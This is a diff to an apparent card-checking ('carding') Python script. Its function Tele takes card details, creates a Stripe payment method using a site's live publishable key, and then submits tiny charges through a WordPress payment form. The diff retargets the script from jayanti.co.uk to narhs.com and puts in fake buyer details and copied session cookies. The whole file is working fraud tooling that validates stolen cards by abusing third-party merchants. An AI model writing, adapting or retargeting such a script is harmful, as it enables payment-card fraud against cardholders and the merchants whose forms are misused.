@@ -26,29 +26,35 @@ def Tele(ccx):
 	    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Mobile Safari/537.36',
 	}
 	
-	data = f'type=card&card[number]={n}&card[cvc]={cvc}&card[exp_month]={mm}&card[exp_year]={yy}&payment_user_agent=stripe.js%2F56f7e9b608%3B+stripe-js-v3%2F56f7e9b608%3B+card-element&key=pk_live_51LanGBHHjRYUkug8BQqvlVSdf7vdZIRWepkjodjgBAC57T4A3ue6rit5IUedNaWemGOtJMQB2QkxmLXdLNuyFejB00xn7xun7G'
+	data = f'type=card&card[number]={n}&card[cvc]={cvc}&card[exp_month]={mm}&card[exp_year]={yy}&payment_user_agent=stripe.js%2F0b5b1045be%3B+stripe-js-v3%2F0b5b1045be%3B+card-element&key=pk_live_51N6gATHEG5XmHMNojyWOS5GfWF4em7PqNE1tTrdW1UFIiuvLOpVhQMJjmTkMsN7rCYqhm9dDhhAHJ8Zq595yjq5s00hWXN3M0X'
 	
 	r1 = requests.post('https://api.stripe.com/v1/payment_methods', headers=headers, data=data)
 	
 	pm = r1.json()['id']
 	
 	cookies = {
-	    '_pk_ref.1.9b2a': '%5B%22%22%2C%22%22%2C1742973431%2C%22https%3A%2F%2Fwww.google.com%2F%22%5D',
-	    '_pk_id.1.9b2a': '03b4d2fb9b82ef17.1742973431.',
-	    '_pk_ses.1.9b2a': '1',
-	    '__stripe_mid': 'b32ff061-b929-4a66-8593-f9ce83e4e3f8d79e5b',
-	    '__stripe_sid': 'c9ed159a-9a6c-42f4-ac31-286d88badd0ee98ebf',
-	    'cookie_notice_accepted': 'true',
+	    'tk_or': '%22https%3A%2F%2Fwww.google.com%2F%22',
+	    'tk_lr': '%22https%3A%2F%2Fwww.google.com%2F%22',
+	    'sbjs_migrations': '1418474375998%3D1',
+	    'sbjs_current_add': 'fd%3D2025-04-02%2017%3A00%3A15%7C%7C%7Cep%3Dhttps%3A%2F%2Fnarhs.com%2Ftranscript-request%2F%7C%7C%7Crf%3Dhttps%3A%2F%2Fwww.google.com%2F',
+	    'sbjs_first_add': 'fd%3D2025-04-02%2017%3A00%3A15%7C%7C%7Cep%3Dhttps%3A%2F%2Fnarhs.com%2Ftranscript-request%2F%7C%7C%7Crf%3Dhttps%3A%2F%2Fwww.google.com%2F',
+	    'sbjs_current': 'typ%3Dorganic%7C%7C%7Csrc%3Dgoogle%7C%7C%7Cmdm%3Dorganic%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29',
+	    'sbjs_first': 'typ%3Dorganic%7C%7C%7Csrc%3Dgoogle%7C%7C%7Cmdm%3Dorganic%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29',
+	    'sbjs_udata': 'vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Linux%3B%20Android%2010%3B%20K%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F132.0.0.0%20Mobile%20Safari%2F537.36',
+	    'sbjs_session': 'pgs%3D1%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fnarhs.com%2Ftranscript-request%2F',
+	    'tk_r3d': '%22https%3A%2F%2Fwww.google.com%2F%22',
+	    '__stripe_mid': '45ba4ad4-2987-4906-a5c2-2c035044182f5adf8e',
+	    '__stripe_sid': '8f3de5db-b352-41a7-a2d7-eadf7b54c7df3be9df',
 	}
 	
 	headers = {
-	    'authority': 'jayanti.co.uk',
+	    'authority': 'narhs.com',
 	    'accept': '*/*',
 	    'accept-language': 'en-TH,en;q=0.9,th-DZ;q=0.8,th;q=0.7,en-GB;q=0.6,en-US;q=0.5',
 	    'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
-	    # 'cookie': '_pk_ref.1.9b2a=%5B%22%22%2C%22%22%2C1742973431%2C%22https%3A%2F%2Fwww.google.com%2F%22%5D; _pk_id.1.9b2a=03b4d2fb9b82ef17.1742973431.; _pk_ses.1.9b2a=1; __stripe_mid=b32ff061-b929-4a66-8593-f9ce83e4e3f8d79e5b; __stripe_sid=c9ed159a-9a6c-42f4-ac31-286d88badd0ee98ebf; cookie_notice_accepted=true',
-	    'origin': 'https://jayanti.co.uk',
-	    'referer': 'https://jayanti.co.uk/',
+	    # 'cookie': 'tk_or=%22https%3A%2F%2Fwww.google.com%2F%22; tk_lr=%22https%3A%2F%2Fwww.google.com%2F%22; sbjs_migrations=1418474375998%3D1; sbjs_current_add=fd%3D2025-04-02%2017%3A00%3A15%7C%7C%7Cep%3Dhttps%3A%2F%2Fnarhs.com%2Ftranscript-request%2F%7C%7C%7Crf%3Dhttps%3A%2F%2Fwww.google.com%2F; sbjs_first_add=fd%3D2025-04-02%2017%3A00%3A15%7C%7C%7Cep%3Dhttps%3A%2F%2Fnarhs.com%2Ftranscript-request%2F%7C%7C%7Crf%3Dhttps%3A%2F%2Fwww.google.com%2F; sbjs_current=typ%3Dorganic%7C%7C%7Csrc%3Dgoogle%7C%7C%7Cmdm%3Dorganic%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_first=typ%3Dorganic%7C%7C%7Csrc%3Dgoogle%7C%7C%7Cmdm%3Dorganic%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_udata=vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Linux%3B%20Android%2010%3B%20K%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F132.0.0.0%20Mobile%20Safari%2F537.36; sbjs_session=pgs%3D1%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fnarhs.com%2Ftranscript-request%2F; tk_r3d=%22https%3A%2F%2Fwww.google.com%2F%22; __stripe_mid=45ba4ad4-2987-4906-a5c2-2c035044182f5adf8e; __stripe_sid=8f3de5db-b352-41a7-a2d7-eadf7b54c7df3be9df',
+	    'origin': 'https://narhs.com',
+	    'referer': 'https://narhs.com/transcript-request/',
 	    'sec-ch-ua': '"Not A(Brand";v="8", "Chromium";v="132"',
 	    'sec-ch-ua-mobile': '?1',
 	    'sec-ch-ua-platform': '"Android"',
@@ -60,15 +66,11 @@ def Tele(ccx):
 	}
 	
 	params = {
-	    't': '1742973514789',
+	    't': '1743613301320',
 	}
 	
-	data = {
-	    'data': '__fluent_form_embded_post_id=13&_fluentform_6_fluentformnonce=327a5a42c6&_wp_http_referer=%2F&names%5Bfirst_name%5D=Rodam&names%5Blast_name%5D=User&input_text_2=0817480671&email=rodamuser20%40gmail.com&address1%5Baddress_line_1%5D=Street%2027&address1%5Baddress_line_2%5D=&address1%5Bcity%5D=New%20York&address1%5Bstate%5D=New%20York&address1%5Bzip%5D=10080&address1%5Bcountry%5D=US&custom-payment-amount=0.30&payment_method=stripe&__stripe_payment_method_id='+str(pm)+'',
-	    'action': 'fluentform_submit',
-	    'form_id': '6',
-	}
+	data = 'data=item_5__fluent_sf%3D%26__fluent_form_embded_post_id%3D458%26_fluentform_5_fluentformnonce%3D76c8c00264%26_wp_http_referer%3D%252Ftranscript-request%252F%26input_text_2%3DRodam%26input_text_3%3DUser%26datetime%3D04%252F10%252F2001%26email%3Drodamuser22%2540gmail.com%26input_text%3DNY%26dropdown%3DCommon%2520App%26terms-n-condition%3Don%26input_radio%3DOfficial%2520(%252410%252Fea)%26numeric-field%3D1%26description%3D%26custom-payment-amount%3D0.50%26payment_method%3Dstripe%26__stripe_payment_method_id%3D'+str(pm)+'&action=fluentform_submit&form_id=5'
 	
-	r2 = requests.post('https://jayanti.co.uk/wp-admin/admin-ajax.php', params=params, cookies=cookies, headers=headers, data=data)
+	r2 = requests.post('https://narhs.com/wp-admin/admin-ajax.php', params=params, cookies=cookies, headers=headers, data=data)
 	
 	return (r2.json())
